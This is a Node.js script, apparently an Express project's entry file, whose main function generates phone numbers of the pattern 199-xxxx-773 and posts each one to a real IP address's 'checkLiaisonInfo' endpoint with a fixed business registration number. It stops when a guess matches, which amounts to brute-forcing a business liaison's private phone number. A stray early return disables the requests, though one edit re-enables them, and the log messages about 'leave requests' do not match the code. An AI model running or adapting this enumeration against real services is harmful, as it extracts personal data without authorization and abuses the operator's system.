// 管理系统
//  入口文件
const express = require("express");
const path = require("path");
// const fs = require('fs')
// const moment = require('moment')
// let Jwt = require('./util/token')
// 模块开发后台
// const basicsRouter = require("./route/basics-router");
// const applicationRouter = require("./route/application-router");
// const openAiRouter= require("./route/openai-router");

const axios = require('axios');
 

const bodyParser = require("body-parser");
const cors = require("cors");
let app = express();
var url=require('url');
const httpProxy = require('express-http-proxy')
const dateFormat = require('./util/dateFormat')
app.use(bodyParser.json({limit : "5000000000kb"}));

// const multer = require("multer");
//挂载参数处理中间件
app.use(cors());
//处理json格式的参数
app.use(bodyParser.json());
// 处理表单数据
app.use(
  bodyParser.urlencoded({
    extended: true
  })
);

/**
 * 查询营业执照的联络员手机号
 * zsnum 要查询数的最大值
 * fzIdx 分割数
 */

function phoneFun (zsnum,fzIdx=1,wsnum){
    if(wsnum){
        wsnum =  `${zsnum}`.length
    }
    let index = Math.floor(zsnum/fzIdx)
    let objs = {}
    let indsObj={}
    let clerObj={}
    for(let i =0;i<=index;i++){
        let name= `a${i}`
        if(zsnum<fzIdx){
            fzIdx = zsnum
        }
        indsObj[name] = i==index?zsnum+1: (i+1)*fzIdx
        objs[name] = i*fzIdx
        clerObj[name] = setInterval(()=>{
            if(indsObj[name]<=objs[name]){
                clearInterval(clerObj[name])
                clerObj[name] = null;
                return
            }
            let i = objs[name].toString()
            let le = i.length
            let b =  wsnum-le
            let c = ''
            if(b!=0){
                for(let y=0;y<b;y++ ){
                    c+='0'
                }
            }
            c = '199'+c+objs[name]+'773'
            console.log(indsObj[name],objs[name]);
            console.log(c);
            objs[name] = objs[name]+1;
            oldPhoneUrl(c)
        },1000)
    }
    let oldPhoneUrl = (c)=>{
        return
        let  apiUrl = 'http://218.26.1.108:9081/checkLiaisonInfo.jspx';
        apiUrl = `${apiUrl}?regNo=92140728MA0L2G0HXK&oldPhone=${c}`
        axios.post(apiUrl,null,)
        .then((response) => {
          console.log('请假成功！');
          console.log(response.data); // 输出返回的数据
          if(!response.data.oldPhone){
            console.log("----------查询到---------------------",c);
            Object.keys(clerObj).map(item=>{
                clearInterval(clerObj[item])
            })
            return
          }
        })
        .catch((error) => {
          console.error('请假失败！');
          console.error(error);
        });
    }
}

// 
phoneFun(9999,100,0)
// function aa(c){
    // let  apiUrl = 'http://218.26.1.108:9081/checkLiaisonInfo.jspx';
    // apiUrl = `${apiUrl}?regNo=92140728MA0L2G0HXK&oldPhone=${c}`
    // axios.post(apiUrl,null,)
    // .then((response) => {
    //   console.log('请假成功！');
    //   console.log(response.data); // 输出返回的数据
    //   if(!response.data.oldPhone){
    //     console.log("----------查询到---------------------",c);
    //     clearInterval(cls)
    //     clearInterval(cls1)

    //     return
    //   }
    // })
    // .catch((error) => {
    //   console.error('请假失败！');
    //   console.error(error);
    // });
// }
app.listen(3033, function () {
  console.log("http://localhost:3033");
});